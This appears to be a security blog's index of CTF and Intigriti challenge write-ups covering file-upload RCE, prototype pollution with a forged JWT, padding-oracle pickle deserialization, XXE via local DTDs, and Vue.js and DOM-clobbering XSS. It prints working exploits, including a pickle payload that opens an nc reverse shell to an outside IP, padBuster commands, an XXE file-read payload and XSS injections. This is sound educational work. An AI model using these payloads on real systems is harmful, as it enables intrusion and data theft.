[{"categories":["CTF"],"content":"The next challenge we did with Varik Matevosyan on OFFZONE Moscow CTF was an express.js file upload application - Express Notes. ","date":"28-08-2022","objectID":"/2022/08/offzone-express-notes/:0:0","tags":["nodejs","express","redis","fileupload"],"title":"Express notes - \"OFFZONE\" express file upload challenge","uri":"/2022/08/offzone-express-notes/"},{"categories":["CTF"],"content":"The challenge The description of the challenge was: Hi! Check my simple nodejs express app that allows you to store simple notes and file attachments. get Here is file As we got the source code, we could see it’s an express server with express-fileupload middleware and using redis as the data store. And it does what the challenge description says - you can register a user then create notes and attach files to that notes. ","date":"28-08-2022","objectID":"/2022/08/offzone-express-notes/:0:1","tags":["nodejs","express","redis","fileupload"],"title":"Express notes - \"OFFZONE\" express file upload challenge","uri":"/2022/08/offzone-express-notes/"},{"categories":["CTF"],"content":"Reviewing the codebase Looking through the server.js we couldn’t find anything interesting until /notes POST endpoint that was passing user-supplied body to db.createNote with no sanitization or validation. server.js line 146-152 app.post('/notes', ensureAuth, async (req, res) =\u003e { const nid = await db.createNote(req.body); await db.addNoteToUser(req.session.user.id, nid); res.flash('success', `Note ${nid}was created!`); res.redirect(`/notes/${nid}`); }); And createNote itself was just creating a redis record with that body. db.js line 92-97 async createNote(content) { const nid = await nanoid(); const stamp = Date.now(); await db.hmset(`note:${nid}`, {...content, 'hashcash': stamp}); return nid; } Then looking through /notes/:nid GET endpoint we saw that it executed a javascript code with vm2 sandbox and set with require: { external: true } option, which, as the name suggests, enables it to require external files. Also on line 15 (below), we can see that the “sandboxed” code executed note.file which we most probably could supply, because, as said above in /notes POST endpoint, we can store a note object with arbitrary properties. server.js line 154-183 app.get('/notes/:nid', ensureAuth, async (req, res) =\u003e { const { nid } = req.params; if (!await db.hasUserNoteAcess(req.session.user.id, nid)) { return res.redirect('/notes'); } db.getNote(nid).then((note) =\u003e { if (note.fileLoaded){ out = {} const vm = new NodeVM( { console: 'inherit', sandbox: { note, out }, require: { external: true } } ); c = ` try{ text = require(note.file)[\"userdata\"]; delete require.cache[require.resolve(note.file)]; out.text = text; } catch (error) { out.text = \"Can't load file ;(\"; }` vm.run(c); text = out.text; } else{ text = \"Thank you for using our service. File now is processing on the server. You can reload page to check if file loaded.\"; } res.render('note', { nid, note, text }); }); }); So we could control note.file parameter and execute any javascript file. But we needed to upload a file to a known location to pass it to the sink. And /notes/:nid/upload was the file upload endpoint we needed as it uploads the user-supplied file to /app/uploads. server.js line 185-209 app.post('/notes/:nid/upload', ensureAuth, async (req, res) =\u003e { const timeUploaded = (new Date()).toISOString(); const { nid } = req.params; const textFile = Array.isArray(req.files?.textFile) ? req.files?.textFile?.shift() : req.files?.textFile; const uploadPath = __dirname + '/uploads/' + uuidv4() + '_' + textFile?.name; const hashcash = await db.checkHashcash(nid, req.body.hashcash); if (!textFile) { return res.status(400).send('No files were uploaded.'); } if (!hashcash){ textFile.mv(\"/dev/null\") return res.status(400).send('Wrong hashcash.'); } FILE_ID = FILE_ID+1; db.addFile(nid, uploadPath, timeUploaded, FILE_ID); db.genHashcash(nid); res.redirect(`/notes/${nid}`); // since node work in 1 thread, data parsing hangs all event loop. Spawning in new process setTimeout(()=\u003e{ execFile(`./dataParser`, [textFile[\"tempFilePath\"], uploadPath], (error, stdout, stderr) =\u003e { textFile.mv(\"/dev/null\"); db.updateFileStatus(nid); }); }, 0); }); But on line 20 (above), it also passes our file through ./dataParser program before moving to the uploads directory, which makes achieving code execution hard, escaping potentially dangerous characters and setting the payload as a string. before ${require('child_process')} after ./dataParser var user_data = `\\$\\{require('child_process')\\}` module.exports = { user_data } After playing a bit with the data processor we realized that we could not bypass the filtering, and we moved forward to finding other ways to supply our uploaded file. So we went through /notes/:nid/upload once more and saw that if we provided other form parameter name than textFile for the file, it would be uploaded to /tmp and not be removed, because the check on line 7 (see above in server.js line 185-209) would fail and there would be no further processing of the file. 400 respons","date":"28-08-2022","objectID":"/2022/08/offzone-express-notes/:0:2","tags":["nodejs","express","redis","fileupload"],"title":"Express notes - \"OFFZONE\" express file upload challenge","uri":"/2022/08/offzone-express-notes/"},{"categories":["CTF"],"content":"Exploit Awesome! So here’s the full exploit chain. Create a note and get the note ID, Crash the server, Upload our script with /notes/:nid/upload to /tmp/tmp-1-$Date.now() path, Get the Date header from the upload response and convert it to milliseconds: in our case, it was 1661424636000, Run the script below and get a reverse shell exploit.py import requests import threading HOST = 'express-notes.ctfz.one' cookies = { 'lang': 'en-US', 'connect.sid': '\u003csession-cookie\u003e' } headers = { 'Host': HOST, 'Content-Type': 'application/x-www-form-urlencoded' } def run_in_thread(fn): def run(*k, **kw): t = threading.Thread(target=fn, args=k, kwargs=kw) t.start() return t return run @run_in_thread def run_brute(timestamps): for timestamp in timestamps: brute(timestamp) def brute(timestamp): data = 'title=test\u0026content=test\u0026fileLoaded=true\u0026file=/tmp/tmp-1-%s' % (timestamp) response = requests.post('https://%s/notes' % HOST, cookies=cookies, headers=headers, data=data, allow_redirects=True) print(data, response.elapsed.total_seconds()) response_time = 1661424636000 NUM_THREADS = 5 LIMIT = 1000 / NUM_THREADS for n in range(NUM_THREADS): start = response_time + LIMIT * n end = start + LIMIT run_brute(range(start, end)) Running the script above, we got a reverse shell connection to our server and got the flag CTFZone{B3_C4reful_w1th_F1l3upl04d_L1bs}success \" CTFZone{B3_C4reful_w1th_F1l3upl04d_L1bs} ","date":"28-08-2022","objectID":"/2022/08/offzone-express-notes/:0:3","tags":["nodejs","express","redis","fileupload"],"title":"Express notes - \"OFFZONE\" express file upload challenge","uri":"/2022/08/offzone-express-notes/"},{"categories":["CTF"],"content":"OFFZONE Moscow team made a great challenge on prototype pollution and we with my friend Varik Matevosyan had a fun time finding gadgets for it. ","date":"27-08-2022","objectID":"/2022/08/offzone-delicious-and-point/:0:0","tags":["nodejs","javascript","jwt","axios","prototype-pollution","gadgets"],"title":"Delicious and Point - \"OFFZONE\" prototype pollution challenge","uri":"/2022/08/offzone-delicious-and-point/"},{"categories":["CTF"],"content":"The challenge The description of the challenge was: Hey, guys! McDonald’s has rebrended. But now there is no BigMac. I’m very sad, I’m loving it. Here is source version:'3'services:back_server:build:./back_servercommand:node index.jsexpose:- \"3000\"deploy:resources:limits:cpus:'0.5'memory:200Mfront_server:build:./front_servercommand:node index.jsexpose:- \"3000\"deploy:resources:limits:cpus:'0.5'memory:200Mnginx:build:./browser_frontports:- 80:80deploy:resources:limits:cpus:'0.5'memory:200M As stated in the docker-compose.yaml file above the challenge website consisted of 3 services: browser_front for serving static files, front_server for processing order requests from users back_server for creating the orders browser_front/nginx/default.conf upstream front_server { server front_server:3000; } server { listen 80 default_server; server_name localhost; #access_log /var/log/nginx/host.access.log main; location /create_order { proxy_pass http://front_server; } location / { try_files $uri $uri/ =404; root /var/www/html; index index.html index.htm; } } front_server/index.js snippet app.post('/create_order', async (req, res) =\u003e { console.log(req.body); console.log(JSON.stringify(req.body)); const child = child_process.spawn('node',['./make_order.js'],{timeout:3000}); child.stdin.write(JSON.stringify(req.body)); let scriptOutput = ''; child.stdout.setEncoding('utf8'); child.stdout.on('data', function(data) { data=data.toString(); scriptOutput+=data; }); child.once('exit', function(code) { try { console.log (\"parsing: scritOutput\") console.log(scriptOutput) created_order = JSON.parse(scriptOutput) categories.map( (category) =\u003e { if(created_order[category]['BigMac'] \u003e 0){ //Wow, you bougth BigMac! created_order[category]['flag'] = fs.readFileSync('./flag.txt').toString() } }); res.json({created_order}) } catch (e) { console.log(e) res.json({error:\"error\"}) } }); }) So to get the flag we need to set BigMac property of some category to a value greater than 0 (line 23 above). But there is one problem - the backend server sets BigMac property of the category to 0 if it is set the property exists (line 17 below). back_server/index.js app.post('/create_order', (req, res) =\u003e { const bad_categories = Object.keys(req.body).filter( (key) =\u003e categories.indexOf(key)==-1 ) if (bad_categories.length\u003e0) { res.json({success: false,message:'bad format1'}) return } categories.map( (category) =\u003e { if(Object.keys(req.body).indexOf(category) == -1 ) { res.json({success: false,message:'bad format2'}) return } if(Object.keys(req.body[category]).indexOf('BigMac') != -1 ) { //BigMac is too hard!!! We can't make it. req.body[category]['BigMac']=0; } }); result = {success: true, jwt: jwt.sign(req.body,jwt_key,{algorithm:'HS256'})} res.json(result) }) ","date":"27-08-2022","objectID":"/2022/08/offzone-delicious-and-point/:0:1","tags":["nodejs","javascript","jwt","axios","prototype-pollution","gadgets"],"title":"Delicious and Point - \"OFFZONE\" prototype pollution challenge","uri":"/2022/08/offzone-delicious-and-point/"},{"categories":["CTF"],"content":"Finding prototype pollution sink We could not find any vulnerability in either front_server/index.js or back_server/index.js, so we started inspecting front_server/make_order.js. front_server/make_order.js const open = require('node:fs/promises').open; const jwt = require('node-jsonwebtoken'); const axios = require('axios'); var instance = axios.create({ baseURL: 'http://back_server:3000', timeout: 1000 }); const categories = ['meat','chicken','potato'] async function main() { process.stdin.on('data', async (data) =\u003e { //create order in correct format var order = {}; categories.map( (category) =\u003e { order[category] = {} }); data = JSON.parse(data); Object.keys(data).map( (category) =\u003e { Object.keys(data[category]).map( (item) =\u003e { order[category][item] = data[category][item] }) }); const headers = { 'Content-Type': 'application/json' } let response = await instance.post('/create_order',JSON.stringify(order),{headers}); if( !response.data.success ) { console.log({\"error\":\"error\"}) process.exit() } let token = response.data.jwt; // let's check jwt // effective key reading let fd = await open('./jwtkey.txt'); let x = await fd.read({buffer: Buffer.alloc(1024)}); let key = x.buffer.toString().slice(0,x.bytesRead); let created_order = jwt.verify(token,key); delete created_order['iat']; console.log(JSON.stringify(created_order,null,null)); process.exit() } ) } main(); On line 21, we can see obvious prototype pollution which can be achieved with the following JSON object: { \"__proto__\": { \"polluted\": 1 } } There is no proper gadget in the make_order.js itself (only response.data.success and response.data.jwt which were not of much use), which meant we needed to go deeper into used dependencies. ","date":"27-08-2022","objectID":"/2022/08/offzone-delicious-and-point/:0:2","tags":["nodejs","javascript","jwt","axios","prototype-pollution","gadgets"],"title":"Delicious and Point - \"OFFZONE\" prototype pollution challenge","uri":"/2022/08/offzone-delicious-and-point/"},{"categories":["CTF"],"content":"Finding the gadgets There are 3 dependencies used in the script: node:fs/promises node-jsonwebtoken axios So the plan was to redirect axios client to our server somehow, provide a jwt signed by us and make the dep node-jsonwebtoken verify it as valid. Node.js docs on fsPromises.open shows that it opens a \u003cFileHandle\u003e and make_order.js uses to read ./jwtkey.txt file (line 36) which has a very interesting option for us - length(see here). If we can pollute that property of the options we could make it read 0 bytes. { \"__proto__\": { \"length\": 0 } } Sending a request to https://delipo.ctfz.one/create_order with the body above results in an error, which most probably indicates that the server failed to verify with jwt key, as it was empty when passed to jwt.verify on line 40. Error thrown on polluted lengthlength error \" Error thrown on polluted length Now we need to make axios to send the request to a server controlled by us and respond with our jwt token. baseURL set in line 6 seems to be the best fit, but it is already passed as an option. Disregarding that fact, we tried to pollute baseURL with the following JSON object: { \"__proto__\": { \"length\": 0, \"baseURL\":\"https://our-server\" } } And to our surprise, it worked! Collaborator requestcollaborator request \" Collaborator request But we wanted to know what was the reason for this behavior, and digging into axios codebase we found mergeConfig function which was responsible for that. In lib/core/mergeConfig.js on line 93 (here) we can see that it calls a function using mergeMap map (line 63) for the provided config properties. For baseURL it is defaultToConfig2 (defined on line 46) which itself calls getMergedValue (defined on line 18) which effectively merges our polluted baseURL into the passed config. ","date":"27-08-2022","objectID":"/2022/08/offzone-delicious-and-point/:0:3","tags":["nodejs","javascript","jwt","axios","prototype-pollution","gadgets"],"title":"Delicious and Point - \"OFFZONE\" prototype pollution challenge","uri":"/2022/08/offzone-delicious-and-point/"},{"categories":["CTF"],"content":"Exploiting As we previously set the key as and empty string with a polluted length:0 property, we can now create a JWT with no signature (e.g. none algorithm). So our server should respond with something like: { \"success\": \"true\", \"jwt\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJtZWF0Ijp7IkhhbWJ1cmdlciI6MCwiQ2hlZXNlYnVyZ2VyIjowfSwiY2hpY2tlbiI6eyJDaGlja2VuQnVyZ2VyIjowLCJCaWdNYWMiOjF9LCJwb3RhdG8iOnsiRnJpZXMiOjAsIkNvY2EtQ29sYSI6MH19.\" } And finally, by sending the request to our server we will get the flag! CTFZone{I_R34lLy_L0v3d_17_:(}success \" CTFZone{I_R34lLy_L0v3d_17_:(} Cover image from https://portswigger.net/blog/finding-client-side-prototype-pollution-with-dom-invader. ","date":"27-08-2022","objectID":"/2022/08/offzone-delicious-and-point/:0:4","tags":["nodejs","javascript","jwt","axios","prototype-pollution","gadgets"],"title":"Delicious and Point - \"OFFZONE\" prototype pollution challenge","uri":"/2022/08/offzone-delicious-and-point/"},{"categories":["CTF"],"content":"On the 1 CAT COMPANY CTF we didn’t manage to finalize our solution for the BabyPython challenge, created by Vahe Karapetyan, but one of our team members - Varik Matevosyan, solved it anyways after the time was up. Below is his write-up, enjoy! ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:0","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["CTF"],"content":"Analyzing the challenge One of the most interesting and difficult challenges on the 1Cat CTF was the “Baby Python”. In the challenge description we find a URL and a python file to download: endpoint: http://baby.2021.ctf.cyhub.am/ files: https://2021.ctf.cyhub.am/materials/securepickle.py Let’s first check the website. When we open the page we can see that each time it is giving us a random string. e.g. random stringrandom string \" random string After taking a look at the provided source code we see this a crypto challenge: import base64 import pickle from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto.Random import get_random_bytes class AESCipher: def __init__(self, key): self.key = pad(key.encode('utf-8'), AES.block_size) def encrypt(self, data): iv = get_random_bytes(AES.block_size) self.cipher = AES.new(self.key, AES.MODE_CBC, iv) return base64.b64encode(iv + self.cipher.encrypt(pad(data, AES.block_size))) def decrypt(self, data): raw = base64.b64decode(data) self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size]) return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size) class SecurePickle: \"\"\"Baby Devloper wanted to secure the pickle. Since it's not secure. Absolutely. Let's Encrypt\"\"\" def __init__(self, key): self.key = key self.encryptor = AESCipher(key) def loads(self, pickled_string): decrypted_string = self.encryptor.decrypt(pickled_string) return pickle.loads(decrypted_string) def dumps(self, object_to_pickle): encrypted_string = self.encryptor.encrypt(object_to_pickle) return encrypted_string def dumps2(self, object_to_pickle): pickled_string = pickle.dumps(object_to_pickle) encrypted_string = self.encryptor.encrypt(pickled_string) return encrypted_string ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:1","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["CTF"],"content":"Python pickle So the SecurePickle class is for loading decrypted pickles and for dumping encrypted ones. As eval is evil so is the pickle. So if we will be able to pass our payload to pickle.loads method it will execute our code. But we have 2 problems before moving forward: Where is the endpoint accepting user input and passing it into the pickle.loads sink? And the second one is that the strings are encrypted with CBC encryption, so we need a key to construct our payload, or do we? The first problem was solved pretty easily, we just ran a directory fuzzer, found /loads endpoint, then ran param miner and found out that it accepts ?obj= query parameter. Passing any encrypted string we got previously from the request to website root http://baby.2021.ctf.cyhub.am/, the page responds with a plaintext string test!. http://baby.2021.ctf.cyhub.am/loads?obj=x+u/CzCbuoRHIkNhAuvVYcTZrfVsq1zgSKxYfguM8UYpgwVPQAOMxvBfgwkIh7vz We can consider that this method decrypts the CBC message and passes it to pickle.loads function, so this surely is the source. ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:2","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["CTF"],"content":"Padding oracle attack As the first problem is solved, let’s find out whether or not we can construct a payload that will be decrypted by the server. After some googling, we found out that CBC encryption is vulnerable to Padding oracle attacks if it is padded by a random IV, which is true in this case. Here are some resources that helped us understand the attack: https://www.youtube.com/watch?v=aH4DENMN_O4 https://www.youtube.com/watch?v=7XZdsR0jHjo https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle TL;DR - an attacker can encrypt an arbitrary message without knowing the encryption key and that’s what we needed. ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:3","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["CTF"],"content":"PadBuster During further research, we also found a ready-to-go exploit by Aon’s Cyber Labs - PadBuster which is a Perl script that will automatically exploit the vulnerable server after passing some required arguments to it. padBuster.pl \u003cURL\u003e EncryptedSample BlockSize(16) -error 'PKCS#7 padding is incorrect.' -encodedtext 'our payload with malicious code' ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:4","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["CTF"],"content":"Exploit To generate the proper payload we should dump a string with pickle and encode it with base64: import pickle import base64 import os class Payload: def __reduce__(self): cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 54.212.140.241 4444 \u003e/tmp/f') return os.system, (cmd,) if __name__ == '__main__': pickled = pickle.dumps(Payload()) print(base64.urlsafe_b64encode(pickled)) This will open a reverse shell to our remote server at 54.212.140.241. So the final arguments for the script will be: perl padBuster.pl 'http://baby.2021.ctf.cyhub.am/loads?obj=X4Dpl9XXEOf5zaa3hyTFcfOkfxIFQ9BfgIwkuA3KNBu85ZOKRM1U4rIkEbxYL0qI' X4Dpl9XXEOf5zaa3hyTFcfOkfxIFQ9BfgIwkuA3KNBu85ZOKRM1U4rIkEbxYL0qI 16 -error \"PKCS#7 padding is incorrect.\" -encodedtext 'gASVbAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFFybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyA1NC4yMTIuMTQwLjI0MSA0NDQ0ID4vdG1wL2aUhZRSlC4=' After running the script and waiting about 30-40 minutes we get our encrypted message: Block 1 Results: [+] New Cipher Text (HEX): ade7fd36447b7b059ad590bb4f94df60 [+] Intermediate Bytes (HEX): 2de3685a447b7b059ad590374ae4b013 ------------------------------------------------------- ** Finished *** [+] Encrypted value is: ref9NkR7ewWa1ZC7T5TfYOMRK%2Fvi1bbhFMwDF52RGJo4VO%2FGV8i6LzWQOb4Xt6RPCE5u6tK79BOyMuPZKNb7eZHoMW8PLbFKu9ffqe3UqBZ3Ku5sqqvKIi0hr0yuSzIRB79ewBeca95BfXrZBXDUa83MgM9NNqc80d2pKODxcjYAAAAAAAAAAAAAAAAAAAAA ------------------------------------------------------- Now let’s set a Netcat listener at port 4444 nc -l 4444 and pass the payload to the server: http://baby.2021.ctf.cyhub.am/loads?obj=ref9NkR7ewWa1ZC7T5TfYOMRK%2Fvi1bbhFMwDF52RGJo4VO%2FGV8i6LzWQOb4Xt6RPCE5u6tK79BOyMuPZKNb7eZHoMW8PLbFKu9ffqe3UqBZ3Ku5sqqvKIi0hr0yuSzIRB79ewBeca95BfXrZBXDUa83MgM9NNqc80d2pKODxcjYAAAAAAAAAAAAAAAAAAAAA As soon as the page is opened we get our reverse shell and reading the environment variables, we find the long-awaited flag: FLAG=cyhub{0244a2ac3d93327dbf77c19a36ef4851000000000}success \" FLAG=cyhub{0244a2ac3d93327dbf77c19a36ef4851000000000} ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:5","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["CTF"],"content":"On November 27 Cyhub Armenia organized a very fun local CTF event - 1 CAT COMPANY CTF and Hayk Andriasyan created an XXE challenge for it. As a task description, we get only the website location: task descriptiontask description \" task description Visiting which we see nothing helpful, so we run our web fuzzer with a generic wordlist and get some interesting endpoints - /health, a health service actuator endpoint, /test some spring endpoint which throws java error containing script’s full path, /api, which returns 403 forbidden response. path disclosurepath disclosure \" path disclosure Combing what we got - task’s name clearly referring to Orange Tsai, NginX server, we can clearly understand we must have NginX off by slash directory traversal vulnerability, so we try traversing to /api endpoint discovered before and succeed api endpointapi endpoint \" api endpoint Fuzzing for the obvious {path}, we find /api/data endpoint which expects XML body api/data endpointapi/data endpoint \" api/data endpoint So we try to exploit the XXE accessing external services via http/https and getting blocked by the parser, accessing external ftp server via file protocol and failing. But we see quickly the difference between existent and non existent file paths. When the server responds Your XML is valid the file exists and /somepath (No such file or directory) when it doesn’t. successfull file readsuccessfull file read \" successfull file read failed file readfailed file read \" failed file read Then we realize that the only way to exfiltrate the data is through exploiting xxe with local dtd files. After trying some known gadgets we fail, so we should find a gadget ourselves. To do so we run a FreeBSD VM, as we know Antranig Vartanian, who is hosting the challenges, is a huuge FreeBSD fan and contributor, installing most probable maven dependencies like spring boot and jetty. And to find local dtd files we run the dtd finder tool made by GoSecure in our home directory with the following command. java -jar dtd-finder-1.1-all.jar /home/tmp-user/.m2/ \u003e out Which yields the following results: /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_9_0.dtd /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_7_6.dtd /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_9_3.dtd /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_6_0.dtd To find which jetty version the server is using, we pull the repo, extract version tags, feed it to Burp’s Intruder and find that it is using 9.3.3.v20150827 intruder windowintruder window \" intruder window We choose configure_6_0.dtd file to create our gadget as we have a perfect candidate CONFIG, which gets reflected few lines after. configure_6.0.dtdconfigure_6.0.dtd \" configure_6.0.dtd To create the gadget we should escape CONFIG reflection on line 41 \u003c!ENTITY % CONFIG 'Set|Get|Put|Call|New|Ref|Array|Map|Property)*\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"file:///usr/home/app/\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///nonexistent/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT asd ('\u003e Sending the payload we get directory listing for the /usr/home/app/ folder initial payloadinitial payload \" initial payload Finally, in .extraverysupErSEcr3Tfolder folder, we find flag.txt cyhubctf{error_based_xxe_with_orange_tsai}flag \" cyhubctf{error_based_xxe_with_orange_tsai} Thanks Cyhub for such a great event !. ","date":"28-11-2021","objectID":"/2021/11/cyhub-off-by-slash-xxe/:0:0","tags":["web security","xxe gadget","java","cyhub","xxe","nginx","off-by-slash"],"title":"OrangeSite - \"1 CAT COMPANY CTF\" spring xxe challenge","uri":"/2021/11/cyhub-off-by-slash-xxe/"},{"categories":["Challenges"],"content":"Intigiriti’s November challenge by IvarsVids was about a Vue.js one-pager that reflected user input with some replacements. After visiting the challenge homepage at https://challenge-1121.intigriti.io/ we quickly notice it reflects s query parameter not escaping HTML less than and greater than signs resulting in HTML injection. s parameter reflections parameter reflection \" s parameter reflection But the page refuses the execute the injected script because of the content security policy base-uri 'self'; default-src 'self'; script-src 'unsafe-eval' '\u003cemitted\u003e' 'strict-dynamic'; object-src 'none'; style-src '\u003cemitted\u003e' CSP blockingCSP blocking \" CSP blocking As we see unsafe-eval directive is present, which means dynamically eval’ed script will be allowed, so we can try vue.js template injection. To achieve that we should inject our element with app “id”, close the \u003ctitle\u003e with a payload like \u003c/title\u003e\u003cdiv id=app\u003e\u003c/div\u003e and inject the payload within the div. Template delimiters are set to v-{{ and }} on line 45 but after trying to inject templates or general script gadgets from Portswigger’s cheatsheet the WAF is replacing keywords with % characters. replacing keywordsreplacing keywords \" replacing keywords Looking for a potential execuntion sink I refered to Vue api at https://vuejs.org/v2/api/ and found slot-scope deprecated special attribute which is expecting function argument expression. Trying to inject payload like \u003c/title\u003e\u003cdiv id=app\u003e\u003cp slot-scope=\"function(){alert()}\"\u003e\u003c/div\u003e we get the following expection. thrown exceptionthrown exception \" thrown exception So to execute javascript we should close the function expression and then execute our javascript code, but also please note the injection point is within a smaller scope and window parameters are not within this scope. To escape to window scope we can try the classic this.constructor.constructor chain. Injecting a payload like the following we get another exception\u003c/title\u003e\u003cdiv id=\"app\"\u003e\u003cp slot-scope=\"){}}])-this.constructor.constructor('alert(origin)')()})};//\"\u003e\u003c/div\u003e thrown exception 2thrown exception 2 \" thrown exception 2 WAF has replaced is from this with %is% as it is another known script gadget attribute, but we can bypass this using a function from the local scope, e.g. \u003c/title\u003e\u003cdiv id=\"app\"\u003e\u003cp slot-scope=\"){}}])-_c.constructor.constructor('alert(origin)')()})};//\"\u003e\u003c/div\u003e successfull executionsuccessfull execution \" successfull execution For the intended solution check Intigriti’s guide at https://www.youtube.com/watch?v=-_7uL7l0qZk. ","date":"22-11-2021","objectID":"/2021/11/vuejs-script-gadget-intigriti/:0:0","tags":["web security","script gadget","xss","intigriti","vuejs"],"title":"From Intigriti challenge to a Vue.js script gadget","uri":"/2021/11/vuejs-script-gadget-intigriti/"},{"categories":["Challenges"],"content":"This month’s challenge, made by Holme, was a little bit different than the ones I have previously solved as it had a server-side processing issue. Vulnerable page - https://challenge-0221.intigriti.io/ Vulnerable script - https://challenge-0221.intigriti.io/script.js ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:0","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Challenges"],"content":"Issue 1 - Unicode characters improper processing Digging into the embedded script (see the code below) we can see there is no direct source that could reach the only dangerous sink (eval) at line 57: function startGrade() { var text = document.getElementById(\"assignmentText\").value; checkLength(text); result = window.result || { message: \"Your submission is too short.\", error: 1, }; //If the result object hasn't been defined yet, the submission must be too short if (result.error) { endGrade(); } else { getQAnswer(); if (!passQuiz()) { result.message = \"We don't allow robots at the Unicodeversity (yet)!\"; result.error = 1; } else { result.grade = \"ABCDEF\"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions } endGrade(); } } function endGrade() { document.getElementById(\"message\").innerText = result.message; if (result.grade) { document.getElementById( \"grade\" ).innerText = `You got a(n) ${result.grade}!`; } document.getElementById(\"share\").style.visibility = \"initial\"; document.getElementById( \"share-link\" ).href = `https://challenge-0221.intigriti.io/?assignmentTitle=${ document.getElementById(\"assignmentTitle\").value }\u0026assignmentText=${document.getElementById(\"assignmentText\").value}`; delete result; } function checkLength(text) { if (text.length \u003e 50) { result = { message: \"Thanks for your submission!\" }; } } function getQAnswer() { var answer = document.getElementById(\"answer\").value; if (/^[0-9]+$/.test(answer)) { if (typeof result !== \"undefined\") { result.questionAnswer = { value: answer }; } else { result = { questionAnswer: { value: answer } }; } } } function passQuiz() { if (typeof result.questionAnswer !== \"undefined\") { return eval(result.questionAnswer.value + \" == \" + question); } return false; } var question = `${Math.floor(Math.random() * 10) + 1}+ ${ Math.floor(Math.random() * 10) + 1 }`; document.getElementById(\"question\").innerText = `${question}= ?`; document.getElementById(\"submit\").addEventListener(\"click\", startGrade); const urlParams = new URLSearchParams(location.search); if (urlParams.has(\"autosubmit\")) { startGrade(); } It is a common behavior for web apps to reflect an input’s name or id if provided via request body or query string, so does this app (escaping, unfortunately). Escaped reflected parameterEscaped reflected parameter \" Escaped reflected parameter But if we try a Unicode sequence (բարև), we can see it doesn’t get processed normally. Unicode reflected parameterUnicode reflected parameter \" Unicode reflected parameter The first part of a Unicode character byte pair gets rendered and the second pair is getting reflected as is, for example, in the case of letter բ (U+0562), 05 gets rendered and 62 is being returned. ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:1","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Challenges"],"content":"Issue 2 - DOM clobbering as a source to the dangerous sink Now we can escape the reflection point with a doublequote using some character like ∀ (U+2200), but we cannot use event handlers because of CSP nor can construct an inline script element as we cannot guess a server-generated nonce value. script-src 'strict-dynamic' 'nonce-iR/JMMPv7suDLRND7rsPGvDzJxU=' 'unsafe-eval' http: https:;object-src 'none';base-uri 'none'; As said above, looking for DOM vulnerabilities, the only usable sink is eval (at line 56 in the original script) in passQuiz function. function passQuiz() { if (typeof result.questionAnswer !== \"undefined\") { return eval(result.questionAnswer.value + \" == \" + question); } return false; } And to reach it we should be able to control either result.questionAnswer.value or question variable. No source reaches question, but in line 4 we can see that result can be taken from the window object. function startGrade() { var text = document.getElementById(\"assignmentText\").value; checkLength(text); result = window.result || { message: \"Your submission is too short.\", error: 1, So to set its value we should abuse DOM clobbering. And the rendered payload should look something like this 